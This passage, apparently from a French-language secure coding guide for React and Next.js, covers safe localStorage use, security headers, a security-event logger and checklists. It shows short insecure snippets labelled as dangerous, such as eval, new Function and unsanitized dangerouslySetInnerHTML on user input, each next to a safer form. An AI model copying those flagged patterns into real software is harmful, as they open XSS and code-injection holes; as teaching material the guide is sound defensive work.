      const serialized = JSON.stringify({
        value,
        timestamp: Date.now(),
      });
      localStorage.setItem(key, serialized);
    } catch (error) {
      console.error('Storage error:', error);
    }
  },

  /**
   * Récupérer une valeur avec vérification d'expiration
   */
  get<T>(key: string, maxAge?: number): T | null {
    try {
      const item = localStorage.getItem(key);
      if (!item) return null;

      const { value, timestamp } = JSON.parse(item);

      // Vérifier l'expiration
      if (maxAge && Date.now() - timestamp > maxAge) {
        localStorage.removeItem(key);
        return null;
      }

      return value as T;
    } catch {
      return null;
    }
  },

  /**
   * Supprimer une valeur
   */
  remove(key: string): void {
    localStorage.removeItem(key);
  },

  /**
   * Effacer tout le stockage de l'application
   */
  clear(prefix?: string): void {
    if (prefix) {
      const keysToRemove: string[] = [];
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key?.startsWith(prefix)) {
          keysToRemove.push(key);
        }
      }
      keysToRemove.forEach((key) => localStorage.removeItem(key));
    } else {
      localStorage.clear();
    }
  },
};

/**
 * Ce qu'il NE FAUT PAS stocker dans localStorage :
 * - Access tokens
 * - Refresh tokens
 * - Données personnelles sensibles
 * - Mots de passe
 * - Clés API
 *
 * Ce qui peut être stocké :
 * - Préférences utilisateur (thème, langue)
 * - Cache non sensible
 * - État de l'UI
 */
```

---

## Bonnes Pratiques React/Next.js

### Règles de Sécurité React

```tsx
// ❌ DANGEREUX : dangerouslySetInnerHTML sans sanitization
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ SÉCURISÉ : Avec sanitization
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />

// ❌ DANGEREUX : href avec input utilisateur
<a href={userProvidedUrl}>Lien</a>

// ✅ SÉCURISÉ : Validation de l'URL
<SafeLink href={userProvidedUrl}>Lien</SafeLink>

// ❌ DANGEREUX : eval avec input utilisateur
eval(userInput);

// ❌ DANGEREUX : new Function avec input
new Function(userInput);

// ❌ DANGEREUX : setTimeout/setInterval avec string
setTimeout(userInput, 1000);

// ✅ SÉCURISÉ : Utiliser une fonction
setTimeout(() => { /* code sûr */ }, 1000);
```

### Configuration Next.js Sécurisée

```javascript
// next.config.js
/** @type {import('next').NextConfig} */
module.exports = {
  // Headers de sécurité
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
      },
    ];
  },

  // Désactiver le header X-Powered-By
  poweredByHeader: false,

  // Strict mode React
  reactStrictMode: true,

  // Redirections HTTPS (si nécessaire)
  async redirects() {
    return process.env.NODE_ENV === 'production'
      ? [
          {
            source: '/:path*',
            has: [{ type: 'header', key: 'x-forwarded-proto', value: 'http' }],
            destination: 'https://yourdomain.com/:path*',
            permanent: true,
          },
        ]
      : [];
  },

  // Images - domaines autorisés
  images: {
    domains: ['yourdomain.com', 'cdn.yourdomain.com'],
  },
};
```

---

## Audit et Monitoring

### Logger de Sécurité

```typescript
// lib/security/security-logger.ts

type SecurityEventType =
  | 'XSS_ATTEMPT'
  | 'CSRF_FAILURE'
  | 'INJECTION_ATTEMPT'
  | 'RATE_LIMIT_EXCEEDED'
  | 'INVALID_TOKEN'
  | 'UNAUTHORIZED_ACCESS'
  | 'SUSPICIOUS_ACTIVITY';

interface SecurityEvent {
  type: SecurityEventType;
  severity: 'low' | 'medium' | 'high' | 'critical';
  message: string;
  details?: Record<string, any>;
  userId?: string;
  ip?: string;
  userAgent?: string;
  url?: string;
  timestamp: Date;
}

class SecurityLogger {
  private async log(event: SecurityEvent): Promise<void> {
    // Log local
    console.warn(`[SECURITY] ${event.severity.toUpperCase()}: ${event.type}`, {
      message: event.message,
      details: event.details,
      userId: event.userId,
      ip: event.ip,
      timestamp: event.timestamp.toISOString(),
    });

    // Envoyer à un service de monitoring (Sentry, DataDog, etc.)
    if (process.env.NODE_ENV === 'production') {
      await this.sendToMonitoring(event);
    }
  }

  private async sendToMonitoring(event: SecurityEvent): Promise<void> {
    // Implémenter l'envoi vers votre service de monitoring
    // Exemple avec Sentry :
    // Sentry.captureMessage(event.message, {
    //   level: event.severity === 'critical' ? 'fatal' : event.severity,
    //   tags: { type: event.type },
    //   extra: event.details,
    // });
  }

  xssAttempt(details: {
    input: string;
    location: string;
    userId?: string;
    ip?: string;
  }): void {
    this.log({
      type: 'XSS_ATTEMPT',
      severity: 'high',
      message: `XSS attempt detected at ${details.location}`,
      details: {
        sanitizedInput: details.input.slice(0, 100), // Tronquer pour les logs
        location: details.location,
      },
      userId: details.userId,
      ip: details.ip,
      timestamp: new Date(),
    });
  }

  csrfFailure(details: {
    url: string;
    userId?: string;
    ip?: string;
  }): void {
    this.log({
      type: 'CSRF_FAILURE',
      severity: 'medium',
      message: `CSRF token validation failed`,
      details,
      timestamp: new Date(),
    });
  }

  injectionAttempt(details: {
    type: 'SQL' | 'NoSQL' | 'Command' | 'LDAP';
    input: string;
    location: string;
    userId?: string;
    ip?: string;
  }): void {
    this.log({
      type: 'INJECTION_ATTEMPT',
      severity: 'critical',
      message: `${details.type} injection attempt detected`,
      details: {
        injectionType: details.type,
        location: details.location,
        inputPreview: details.input.slice(0, 50),
      },
      userId: details.userId,
      ip: details.ip,
      timestamp: new Date(),
    });
  }

  rateLimitExceeded(details: {
    endpoint: string;
    userId?: string;
    ip?: string;
    limit: number;
    window: number;
  }): void {
    this.log({
      type: 'RATE_LIMIT_EXCEEDED',
      severity: 'low',
      message: `Rate limit exceeded for ${details.endpoint}`,
      details,
      timestamp: new Date(),
    });
  }

  unauthorizedAccess(details: {
    resource: string;
    requiredPermission?: string;
    userId?: string;
    ip?: string;
  }): void {
    this.log({
      type: 'UNAUTHORIZED_ACCESS',
      severity: 'medium',
      message: `Unauthorized access attempt to ${details.resource}`,
      details,
      timestamp: new Date(),
    });
  }
}

export const securityLogger = new SecurityLogger();
```

---

## Checklist de Sécurité

### Checklist XSS

- [ ] Échappement automatique via React (pas de dangerouslySetInnerHTML)
- [ ] Sanitization avec DOMPurify pour le contenu riche
- [ ] Validation et sanitization des URLs
- [ ] CSP configuré avec nonces pour les scripts inline
- [ ] Pas d'eval() ni new Function() avec des entrées utilisateur

### Checklist CSRF

- [ ] Tokens CSRF sur toutes les mutations
- [ ] Cookies avec SameSite=Strict ou Lax
- [ ] Vérification Origin/Referer
- [ ] Double Submit Cookie Pattern

### Checklist Headers

- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] X-XSS-Protection: 1; mode=block
- [ ] Strict-Transport-Security (HSTS)
- [ ] Content-Security-Policy configuré
- [ ] Referrer-Policy: strict-origin-when-cross-origin
- [ ] Permissions-Policy configuré

### Checklist Validation

- [ ] Validation côté client ET serveur
- [ ] Schémas Zod pour toutes les entrées
- [ ] Limites de longueur sur tous les champs
- [ ] Validation des types de fichiers uploadés
- [ ] Protection contre l'injection dans les recherches

### Checklist Stockage

- [ ] Pas de tokens sensibles dans localStorage
- [ ] Cookies httpOnly pour les sessions
- [ ] Cookies Secure en production
- [ ] Expiration des données en cache

### Checklist Monitoring

- [ ] Logging des événements de sécurité
- [ ] Alertes sur les tentatives d'attaque
- [ ] Rate limiting avec monitoring
- [ ] Audit trail des actions sensibles

---

## Ressources

- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Security Headers Scanner](https://securityheaders.com/)
- [OWASP ZAP](https://www.zaproxy.org/) - Scanner de vulnérabilités

---

**Dernière mise à jour** : 2026-01-17
